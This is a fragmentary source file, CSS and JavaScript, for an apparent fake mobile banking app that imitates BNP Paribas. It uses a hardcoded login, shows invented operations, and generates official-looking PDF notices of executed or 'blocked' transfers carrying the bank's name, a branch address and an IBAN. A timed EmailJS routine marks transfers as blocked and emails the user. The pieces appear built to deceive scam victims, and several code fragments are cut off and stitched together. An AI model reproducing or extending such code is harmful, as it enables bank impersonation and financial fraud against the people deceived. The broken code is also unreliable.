<style>  
*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent;touch-action:manipulation;-webkit-text-size-adjust:100%}  
body{background:#eef1f8;font-family:'Segoe UI',Arial,sans-serif;max-width:430px;margin:0 auto;min-height:100vh}  
input,select,textarea{font-size:16px!important;font-family:inherit}  
button{font-family:inherit;cursor:pointer}  
@keyframes spin{from{transform:rotate(0deg)}to{transform:rotate(360deg)}}  
.spin{animation:spin 1s linear infinite}  
#root{min-height:100vh}  
  
.screen{display:none;flex-direction:column;min-height:100vh}  
.screen.active{display:flex}  
  
/* LOGIN */  
.login-header{background:#009A44;padding:36px 24px 28px;display:flex;flex-direction:column;align-items:center}  
.login-body{flex:1;padding:32px 24px 24px;display:flex;flex-direction:column;background:#fff}  
.login-title{font-size:22px;font-weight:800;color:#1a1a1a;margin-bottom:4px}  
.login-sub{font-size:13px;color:#888;margin-bottom:28px}  
.field-label{font-size:11px;font-weight:700;color:#555;display:block;margin-bottom:6px;letter-spacing:.5px;text-transform:uppercase}  
.field-wrap{position:relative;margin-bottom:16px}  
.field-input{width:100%;padding:14px 14px 14px 44px;border-radius:10px;border:1.5px solid #ddd;font-size:16px;background:#fafafa;color:#1a1a1a;outline:none}  
.field-input.err{border-color:#c0001a}  
.field-icon{position:absolute;left:14px;top:50%;transform:translateY(-50%);pointer-events:none}  
.eye-btn{position:absolute;right:14px;top:50%;transform:translateY(-50%);background:none;border:none;padding:0}  
.forgot{text-align:right;margin-bottom:24px}  
.forgot span{color:#009A44;font-size:13px;font-weight:600;cursor:pointer}  
.err-box{background:#fdecea;border:1px solid #f5c6c6;border-radius:8px;padding:10px 14px;display:flex;align-items:center;gap:8px;margin-bottom:16px}  
.err-text{color:#c0001a;font-size:13px;font-weight:500}  
.btn-blue{width:100%;background:#009A44;color:#fff;border:none;border-radius:10px;padding:15px 0;font-weight:700;font-size:15px;display:flex;align-items:center;justify-content:center;gap:8px}  
.btn-blue:disabled{background:#6b8ab8}  
.divider{display:flex;align-items:center;gap:10px;margin:22px 0}  
.divider-line{flex:1;height:1px;background:#eee}  
.divider-text{font-size:12px;color:#bbb}  
.btn-white{width:100%;background:#fff;color:#333;border:1.5px solid #e0e0e0;border-radius:10px;padding:13px 0;font-weight:600;font-size:14px;display:flex;align-items:center;justify-content:center;gap:8px}  
.signup{text-align:center;margin-top:20px;font-size:13px;color:#888}  
.signup span{color:#009A44;font-weight:700;cursor:pointer}  
.login-footer{margin-top:auto;padding-top:32px;text-align:center;font-size:11px;color:#bbb;line-height:1.8}  
.login-footer span{color:#009A44}  
  
/* APP */  
.app-screen{display:none;flex-direction:column;height:100vh;background:#eef1f8}  
.app-screen.active{display:flex}  
.topbar{background:#fff;padding:12px 18px;display:flex;justify-content:space-between;align-items:center;border-bottom:1px solid #eee;box-shadow:0 1px 6px rgba(0,0,0,.06);position:sticky;top:0;z-index:100;flex-shrink:0}  
.notif-dot{position:absolute;top:-3px;right:-3px;width:8px;height:8px;background:#ffdc00;border-radius:50%}  
.scroll-area{flex:1;overflow-y:auto;padding-bottom:60px}  
.bottombar{position:fixed;bottom:0;left:50%;transform:translateX(-50%);width:100%;max-width:430px;background:#fff;border-top:1px solid #eee;display:flex;z-index:200}  
.tab-btn{flex:1;background:none;border:none;padding:8px 0 7px;display:flex;flex-direction:column;align-items:center;gap:3px}  
.tab-label{font-size:9px;color:#aaa;font-weight:400}  
.tab-label.active{color:#009A44;font-weight:700}  
  
/* CARDS */  
.section-pad{padding:0 14px 20px}  
.welcome-name{font-weight:900;font-size:24px;color:#1a1a1a}  
.welcome-sub{font-size:11px;color:#aaa;margin-top:2px}  
.balance-card{background:linear-gradient(135deg,#006B2E 0%,#009A44 55%,#00B050 100%);border-radius:18px;padding:22px;margin-bottom:14px;box-shadow:0 6px 20px rgba(0,49,104,.3);position:relative;overflow:hidden;color:#fff}  
.balance-card::after{content:'';position:absolute;top:-20px;right:-20px;width:110px;height:110px;background:rgba(255,255,255,.07);border-radius:50%}  
.card-label{font-size:12px;font-weight:600;color:rgba(255,255,255,.85)}  
.card-sub{font-size:10px;color:rgba(255,255,255,.7);margin-bottom:8px}  
.card-bal-label{font-size:11px;color:rgba(255,255,255,.8)}  
.card-bal{font-weight:900;font-size:26px;margin:4px 0 16px}  
.card-row{display:flex;justify-content:space-between;align-items:center}  
.card-btn{background:rgba(255,255,255,.18);border:1.5px solid #fff;color:#fff;border-radius:24px;padding:6px 14px;font-size:12px;font-weight:600}  
.quick-actions{background:#fff;border-radius:14px;padding:12px;display:flex;justify-content:space-around;margin-bottom:14px;box-shadow:0 1px 6px rgba(0,0,0,.07)}  
.qa-item{display:flex;flex-direction:column;align-items:center;gap:6px;cursor:pointer}  
.qa-icon{width:44px;height:44px;border-radius:12px;background:#e8f5ec;display:flex;align-items:center;justify-content:center}  
.qa-label{font-size:11px;color:#333;font-weight:500}  
.section-title{font-weight:800;font-size:15px;color:#1a1a1a}  
.section-more{color:#009A44;font-size:12px;font-weight:600;cursor:pointer}  
.ops-card{background:#fff;border-radius:14px;overflow:hidden;box-shadow:0 1px 6px rgba(0,0,0,.07)}  
.op-row{display:flex;align-items:center;padding:12px 14px;border-bottom:1px solid #f0f0f0;gap:10px}  
.op-row:last-child{border-bottom:none}  
.op-icon{width:36px;height:36px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:14px;flex-shrink:0}  
.op-name{font-weight:600;font-size:12px;color:#1a1a1a}  
.op-sub{font-size:10px;color:#aaa}  
.op-amt{font-weight:700;font-size:12px}  
.op-date{font-size:10px;color:#aaa}  
.gest-card{background:#fff;border-radius:14px;padding:14px;display:flex;align-items:center;gap:14px;margin-bottom:14px;box-shadow:0 1px 6px rgba(0,0,0,.07)}  
.gest-name{font-weight:700;font-size:13px;color:#1a1a1a}  
.gest-title{font-size:10px;color:#009A44;font-weight:600}  
.gest-actions{display:flex;gap:8px;margin-left:auto}  
.gest-action-btn{width:36px;height:36px;border-radius:50%;border:1.5px solid #009A44;background:#fff;display:flex;align-items:center;justify-content:center}  
  
/* TABS */  
.inner-tabs{background:#fff;display:flex;border-bottom:1px solid #eee;box-shadow:0 1px 4px rgba(0,0,0,.04)}  
.inner-tab{flex:1;text-align:center;padding:13px 0;font-weight:500;color:#999;font-size:12px;border-bottom:2.5px solid transparent;cursor:pointer;margin-bottom:-1px}  
.inner-tab.active{font-weight:700;color:#009A44;border-bottom-color:#009A44}  
  
/* FORM */  
.form-field{background:#fff;border-radius:16px;padding:14px 16px;margin-bottom:10px;box-shadow:0 2px 8px rgba(0,0,0,.06);border:1px solid #f0f0f0}  
.form-label{font-size:9px;font-weight:800;color:#009A44;letter-spacing:.8px;margin-bottom:4px;text-transform:uppercase}  
.form-input{width:100%;border:none;outline:none;font-size:16px;color:#1a1a1a;background:transparent;font-family:inherit}  
.form-input::placeholder{color:#bbb}  
.btn-blue-big{width:100%;background:#009A44;color:#fff;border:none;border-radius:16px;padding:15px 0;font-weight:800;font-size:14px;display:flex;align-items:center;justify-content:center;gap:8px;box-shadow:0 4px 16px rgba(0,49,104,.3)}  
.btn-blue-big:disabled{background:#6b8ab8;box-shadow:none}  
.success-screen{min-height:70vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:30px 20px;text-align:center;background:#fff}  
.success-icon{width:80px;height:80px;background:#e8f5ec;border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 24px}  
.benef-list{display:flex;gap:8px;overflow-x:auto;padding-bottom:6px;margin-bottom:16px}  
.benef-item{background:#fff;border-radius:12px;padding:10px 12px;display:flex;flex-direction:column;align-items:center;gap:5px;min-width:70px;cursor:pointer;box-shadow:0 1px 4px rgba(0,0,0,.08);flex-shrink:0}  
.benef-item.sel{box-shadow:0 0 0 2px #009A44}  
.benef-avatar{width:36px;height:36px;border-radius:50%;display:flex;align-items:center;justify-content:center;color:#fff;font-weight:800;font-size:11px}  
  
/* COEDTE */  
.visa-card{background:linear-gradient(135deg,#002d10,#006B2E 50%,#009A44 100%);border-radius:20px;padding:26px;margin-bottom:14px;position:relative;overflow:hidden;box-shadow:0 8px 28px rgba(0,49,104,.35);color:#fff}  
.info-row{background:#fff;border-radius:10px;padding:12px 14px;display:flex;justify-content:space-between;align-items:center;margin-bottom:8px;box-shadow:0 1px 4px rgba(0,0,0,.05)}  
  
/* CARD FLIP — vraie rotation 3D */  
.card-scene{  
  width:100%;  
  perspective:650px;  
  perspective-origin:50% 40%;  
  margin-bottom:14px;  
}  
.card-3d{  
  width:100%;  
  height:210px;  
  position:relative;  
  transform-style:preserve-3d;  
  transition:transform 0.8s cubic-bezier(0.4,0.15,0.2,1);  
  cursor:pointer;  
  will-change:transform;  
}  
.card-3d.flipped{  
  transform:rotateY(180deg);  
}  
.card-face{  
  position:absolute;  
  inset:0;  
  border-radius:20px;  
  backface-visibility:hidden;  
  -webkit-backface-visibility:hidden;  
  overflow:hidden;  
}  
.card-front{  
  background:linear-gradient(135deg,#002d10 0%,#006B2E 55%,#009A44 100%);  
  box-shadow:0 12px 32px rgba(0,0,0,.5);  
  color:#fff;  
  padding:22px 24px;  
}  
.card-back{  
  background:linear-gradient(160deg,#1c1c1c 0%,#2d2d2d 100%);  
  box-shadow:0 12px 32px rgba(0,0,0,.6);  
  color:#fff;  
  transform:rotateY(180deg);  
}  
  
  
/* MENU */  
.profile-card{background:#fff;border-radius:16px;padding:18px;margin-bottom:14px;display:flex;gap:14px;align-items:center;box-shadow:0 2px 10px rgba(0,0,0,.07)}  
.profile-avatar{width:54px;height:54px;background:linear-gradient(135deg,#006B2E,#009A44);border-radius:50%;display:flex;align-items:center;justify-content:center;color:#fff;font-weight:800;font-size:17px;flex-shrink:0}  
.doc-item{background:#fff;border-radius:12px;padding:12px 14px;display:flex;gap:10px;align-items:center;box-shadow:0 1px 4px rgba(0,0,0,.05);cursor:pointer;margin-bottom:6px}  
.doc-expand{background:#e8f5ec;border-radius:0 0 12px 12px;margin-top:-4px;margin-bottom:6px}  
.doc-expand-row{display:flex;justify-content:space-between;align-items:center;padding:10px 14px;border-bottom:1px solid rgba(0,49,104,.15)}  
.doc-expand-row:last-child{border-bottom:none}  
.btn-logout{width:100%;background:#fff;color:#009A44;border:1.5px solid #009A44;border-radius:10px;padding:13px 0;font-weight:700;font-size:13px;margin-top:14px}  
  
/* ASSURANCES */  
.assur-item{background:#fff;border-radius:12px;padding:14px;display:flex;gap:10px;align-items:center;box-shadow:0 1px 4px rgba(0,0,0,.06);cursor:pointer;margin-bottom:6px}  
.assur-expand{background:#e8f5ec;border-radius:0 0 12px 12px;margin-top:-4px;margin-bottom:6px;padding:10px 14px}  
.assur-expand-row{display:flex;justify-content:space-between;padding:6px 0;border-bottom:1px solid rgba(0,49,104,.15);font-size:11px}  
.assur-expand-row:last-child{border-bottom:none}  
  
.hist-section-title{font-weight:700;font-size:11px;color:#555;margin-bottom:6px;letter-spacing:.3px}  
.tag-attente{color:#e67e00;font-size:10px;font-weight:700}  
.tag-bloque{color:#c0001a;font-size:10px;font-weight:700}  
  
/* VIREMENT TOGGLE */  
.vir-toggle{display:flex;background:#eef1f8;border-radius:10px;padding:3px;margin-bottom:14px;gap:3px}  
.vir-toggle-btn{flex:1;border:none;border-radius:8px;padding:10px;font-size:12px;font-weight:700;cursor:pointer;font-family:inherit;transition:.2s}  
.vir-toggle-btn.active{background:#009A44;color:#fff}  
.vir-toggle-btn.inactive{background:transparent;color:#666}  
</style>

function opIconSVG(op){  
  if(op.statut==='attente') return '<div class="op-icon" style="background:#fff8e1;font-size:16px">⏳</div>';  
  if(op.statut==='bloque')  return '<div class="op-icon" style="background:#fdecea;font-size:16px">🔒</div>';  
  if(op.icon==='LOYER')  return '<div class="op-icon" style="background:'+BRAND_LIGHT+'"><svg width="20" height="20" viewBox="0 0 24 24" fill="none"><path d="M3 9l9-7 9 7v11a2 2 0 01-2 2H5a2 2 0 01-2-2z" stroke="'+BRAND+'" stroke-width="1.8"/><polyline points="9,22 9,12 15,12 15,22" stroke="'+BRAND+'" stroke-width="1.8"/></svg></div>';  
  if(op.icon==='VENTE')  return '<div class="op-icon" style="background:'+BRAND_LIGHT+'"><svg width="20" height="20" viewBox="0 0 24 24" fill="none"><polyline points="23,6 13.5,15.5 8.5,10.5 1,18" stroke="'+BRAND+'" stroke-width="1.8" stroke-linecap="round"/><polyline points="17,6 23,6 23,12" stroke="'+BRAND+'" stroke-width="1.8" stroke-linecap="round"/></svg></div>';  
  if(op.icon==='DEPENSE') return '<div class="op-icon" style="background:#fdecea"><svg width="20" height="20" viewBox="0 0 24 24" fill="none"><rect x="2" y="5" width="20" height="14" rx="2" stroke="#c0001a" stroke-width="1.8"/><line x1="2" y1="10" x2="22" y2="10" stroke="#c0001a" stroke-width="1.8"/></svg></div>';  
  if(op.icon==='VIREMENT') return '<div class="op-icon" style="background:'+BRAND_LIGHT+'"><svg width="20" height="20" viewBox="0 0 24 24" fill="none"><path d="M5 8h14M5 8l4-4M5 8l4 4" stroke="'+BRAND+'" stroke-width="1.8" stroke-linecap="round"/><path d="M19 16H5M19 16l-4-4M19 16l-4 4" stroke="'+BRAND+'" stroke-width="1.8" stroke-linecap="round"/></svg></div>';  
  var bg=op.plus?BRAND_LIGHT:'#fdecea';  
  return '<div class="op-icon" style="background:'+bg+';font-size:16px">'+op.icon+'</div>';  
}  
  
function opAmtColor(op){  
  if(op.statut==='attente') return '#e67e00';  
  if(op.statut==='bloque') return '#c0001a';  
  return op.plus?'#16a34a':'#c0001a';  
}  
  
function renderOps(ops){  
  if(!ops.length) return '<div style="padding:20px;text-align:center;color:#bbb;font-size:13px">Aucune opération</div>';  
  return ops.map(function(op){  
    var pdfBtn='';  
    if(op.statut==='bloque'||op.statut==='attente'){  
      pdfBtn='<button class="btn-pdf-op" data-opid="'+op.id+'" style="display:flex;align-items:center;gap:4px;background:#fff;border:1.5px solid #c0001a;border-radius:8px;padding:5px 10px;font-size:10px;font-weight:700;color:#c0001a;cursor:pointer;white-space:nowrap;margin-left:8px;flex-shrink:0">'+  
        '<svg width="12" height="12" viewBox="0 0 24 24" fill="none"><path d="M14 2H6a2 2 0 00-2 2v16a2 2 0 002 2h12a2 2 0 002-2V8z" stroke="#c0001a" stroke-width="2"/><polyline points="14 2 14 8 20 8" stroke="#c0001a" stroke-width="2"/></svg>'+  
        'PDF</button>';  
    }  
    return '<div class="op-row">'+opIconSVG(op)+  
      '<div style="flex:1;min-width:0"><div class="op-name">'+op.label+'</div>'+  
      '<div class="op-sub">'+op.sub+(op.statut==='attente'?' <span class="tag-attente">· En attente</span>':op.statut==='bloque'?' <span class="tag-bloque">· Bloqué</span>':'')+'</div></div>'+  
      '<div style="text-align:right;display:flex;align-items:center">'+  
        '<div><div class="op-amt" style="color:'+opAmtColor(op)+'">'+(op.plus?'+ ':'- ')+fmt(Math.abs(op.amt))+'</div>'+  
        '<div class="op-date">'+op.d+'</div></div>'+  
        pdfBtn+  
      '</div></div>';  
  }).join('');  
}

    var btnVirReset=document.getElementById('btn-vir-reset');

        },150);

    document.querySelectorAll('[data-benef]').forEach(function(el){  
      el.addEventListener('click',function(){  
        var i=parseInt(el.dataset.benef);

        virSelectedBenef=i;virNom=b.nom;  
        if(b.intl){virType='intl';virIban=b.iban||'';virBic=b.bic||'';}  
        else{virType='canada';virTransit=b.transit||'';virInstitution=b.institution||'';virCompte=b.compte||'';}  
        render();  
      });  
    });  
    document.querySelectorAll('.btn-vir-to').forEach(function(el){  
      el.addEventListener('click',function(e){  
        e.stopPropagation();

        virSelectedBenef=i;virNom=b.nom;  
        if(b.intl){virType='intl';virIban=b.iban||'';virBic=b.bic||'';}  
        else{virType='canada';virTransit=b.transit||'';virInstitution=b.institution||'';virCompte=b.compte||'';}  
        virementsSubTab='virement';render();  
      });  
    });  
  
    var ids=['vir-nom','vir-email','vir-transit','vir-institution','vir-compte','vir-iban','vir-bic','vir-pays','vir-banque','vir-montant','vir-motif'];

      var el=document.getElementById(id);  
      if(!el)return;

        var map={

          'vir-email':function(v){virEmail=v;},  
          'vir-transit':function(v){virTransit=v;},  
          'vir-institution':function(v){virInstitution=v;},  
          'vir-compte':function(v){virCompte=v;},

          'vir-bic':function(v){virBic=v;},

function doLogin(){  
  var inpId=document.getElementById('inp-id');  
  var inpCode=document.getElementById('inp-code');  
  var id=inpId?inpId.value:'';  
  var code=inpCode?inpCode.value:'';  
  if(!id||!code){loginErr='Veuillez remplir tous les champs.';render();return;}  
  loginLoading=true;loginErr='';render();  
  setTimeout(function(){  
    loginLoading=false;  
    if(id==='3535442525'&&code==='124222'){  
      currentPage='app';currentTab='accueil';render();  
      checkPendingEmails();  
    } else {  
      loginErr='Numéro de client ou mot de passe incorrect.';render();  
    }  
  },900);  
}  
  
function generateVirementPDF(data){  
  var doc=new window.jspdf.jsPDF({orientation:'portrait',unit:'mm',format:'a4'});  
  var W=210, mg=18, y=20;  
  var isBloque=data.statut==='BLOQUÉ';  
  var GREEN=[0,107,60], RED=[192,0,26], GREY=[130,130,130], BLACK=[30,30,30];  
  
  // ── TITRE ────────────────────────────────────────────────────────────────  
  doc.setFont('helvetica','bold');  
  doc.setFontSize(26);  
  doc.setTextColor(GREEN[0],GREEN[1],GREEN[2]);  
  doc.text('BNP PARIBAS',mg,y); y+=8;  
  
  doc.setFont('helvetica','bold');  
  doc.setFontSize(11);  
  doc.setTextColor(BLACK[0],BLACK[1],BLACK[2]);  
  doc.text(isBloque?'AVIS DE BLOCAGE DE VIREMENT':"AVIS D\'EXÉCUTION DE VIREMENT",mg,y); y+=10;  
  
  doc.setDrawColor(210,210,210); doc.setLineWidth(0.3);  
  doc.line(mg,y,W-mg,y); y+=8;  
  
  // ── LIGNE INFOS ───────────────────────────────────────────────────────────  
  function infoRow(label,val,bold,red){  
    doc.setFont('helvetica','normal'); doc.setFontSize(9);  
    doc.setTextColor(GREY[0],GREY[1],GREY[2]);  
    doc.text(label,mg,y);  
    doc.setFont('helvetica',bold?'bold':'normal');  
    if(red){ doc.setTextColor(RED[0],RED[1],RED[2]); }  
    else { doc.setTextColor(BLACK[0],BLACK[1],BLACK[2]); }  
    doc.text(val,mg+68,y);  
    doc.setDrawColor(225,225,225); doc.setLineWidth(0.2);  
    doc.line(mg,y+2,W-mg,y+2);  
    y+=9;  
  }  
  
  infoRow("Référence de l\'opération :",data.reference,false,false);  
  infoRow("Date d\'émission :",data.date,false,false);  
  infoRow('Statut :',isBloque?'Bloqué':'Exécuté',true,isBloque);  
  y+=5;  
  
  // ── SECTION TITRE ─────────────────────────────────────────────────────────  
  function sectionTitle(label){  
    doc.setFont('helvetica','bold'); doc.setFontSize(11);  
    doc.setTextColor(GREEN[0],GREEN[1],GREEN[2]);  
    doc.text(label,mg,y); y+=3;  
    doc.setDrawColor(210,210,210); doc.setLineWidth(0.3);  
    doc.line(mg,y,W-mg,y); y+=7;  
  }  
  
  // ── DONNEUR D'ORDRE ───────────────────────────────────────────────────────  
  sectionTitle("DONNEUR D\'ORDRE (Émetteur)");  
  infoRow('Nom / Raison Sociale :',CLIENT_NOM,true,false);  
  infoRow('Compte à débiter :','FR76 3000 1007 9412 3456 7890 185',false,false);  
  y+=5;  
  
  // ── BÉNÉFICIAIRE ──────────────────────────────────────────────────────────  
  sectionTitle('BÉNÉFICIAIRE');  
  infoRow('Nom / Raison Sociale :',data.beneficiaire,true,false);  
  if(data.type==='International'){  
    infoRow('Compte à créditer :',data.iban||'—',false,false);  
    infoRow('Code BIC :',data.bic||'—',false,false);  
    infoRow('Nom de la banque :',data.banque||'—',false,false);  
    infoRow('Pays :',data.pays||'—',false,false);  
  } else {  
    infoRow('Coordonnées :',data.coordonnees||'—',false,false);  
  }  
  y+=5;  
  
  // ── DÉTAILS FINANCIERS ────────────────────────────────────────────────────  
  sectionTitle('DÉTAILS FINANCIERS');  
  infoRow('Montant :',data.montant,true,false);  
  infoRow('Devise :','Euros (EUR)',false,false);  
  infoRow('Motif / Libellé :',data.motif||'Virement',false,false);  
  infoRow("Frais de l\'opération :",'0,00 €',false,false);  
  y+=10;  
  
  // ── AVIS DE BLOCAGE ───────────────────────────────────────────────────────  
  if(isBloque){  
    doc.setFillColor(255,245,245);  
    doc.setDrawColor(200,0,0); doc.setLineWidth(0.4);  
    doc.roundedRect(mg,y,W-mg*2,28,2,2,'FD');  
    doc.setFont('helvetica','bold'); doc.setFontSize(9);  
    doc.setTextColor(RED[0],RED[1],RED[2]);  
    doc.text('AVIS DE BLOCAGE :',mg+4,y+7);  
    doc.setFont('helvetica','normal'); doc.setFontSize(8.5);  
    doc.setTextColor(50,50,50);  
    var txt="Conformément à la réglementation bancaire en vigueur et aux mesures de sécurité de notre établissement, cette opération de virement a été momentanément suspendue et placée sous statut bloqué pour vérifications complémentaires. Pour toute information relative à la régularisation de cette transaction, veuillez contacter votre conseiller ou le service client.";  
    var lines=doc.splitTextToSize(txt,W-mg*2-10);  
    doc.text(lines,mg+4,y+14);  
    y+=34;  
  }  
  
  // ── NOTE LÉGALE ───────────────────────────────────────────────────────────  
  y=Math.max(y,248);  
  doc.setFont('helvetica','italic'); doc.setFontSize(8);  
  doc.setTextColor(GREY[0],GREY[1],GREY[2]);  
  doc.text("Ce document est une confirmation informatique de votre ordre de virement émise depuis votre application mobile.",W/2,y,{align:'center'}); y+=5;  
  doc.text("Conformément à la réglementation, il est édité à titre d\'information et ne nécessite pas de signature manuscrite.",W/2,y,{align:'center'}); y+=10;  
  
  // ── ADRESSE ───────────────────────────────────────────────────────────────  
  doc.setFont('helvetica','normal'); doc.setFontSize(8);  
  doc.setTextColor(GREY[0],GREY[1],GREY[2]);  
  doc.text('BNP Paribas — Agence Dijon République — 7-9 Place de la République, 21000 Dijon, France',W/2,y,{align:'center'});  
  
  var pdfBlob=doc.output('blob');  
  var blobURL=URL.createObjectURL(pdfBlob);  
  showPDFViewer(blobURL,data.reference);  
}

  // ── iframe PDF ────────────────────────────────────────────────────────────

  }  
  iframe.onerror=function(){

function checkPendingEmails(){  
  try{  
    var keys=Object.keys(localStorage).filter(function(k){return k.indexOf('rbc_pending_')===0;});  
    keys.forEach(function(key){  
      try{  
        var p=JSON.parse(localStorage.getItem(key));  
        if(!p||!p.params)return;  
        var remaining=p.sendAt-Date.now();  
        function sendEmail2(opId,params,k){  
          for(var i=0;i<state.operations.length;i++){  
            if(state.operations[i].id===opId){state.operations[i].statut='bloque';break;}  
          }  
          saveState();  
          notifOpen=true;  
          render();  
          emailjs.send('service_vrsibr4','template_ktb3kre',params,'3HOnfAlcJmti9qCRh')  
            .then(function(){localStorage.removeItem(k);})  
            .catch(function(e){console.error(e);});  
        }  
        var opId=p.opId;var params=p.params;  
        if(remaining<=0){sendEmail2(opId,params,key);}  
        else{setTimeout(function(){sendEmail2(opId,params,key);},remaining);}  
      }catch(e){console.error('checkPending err:',e);}  
    });  
  }catch(e){}  
}
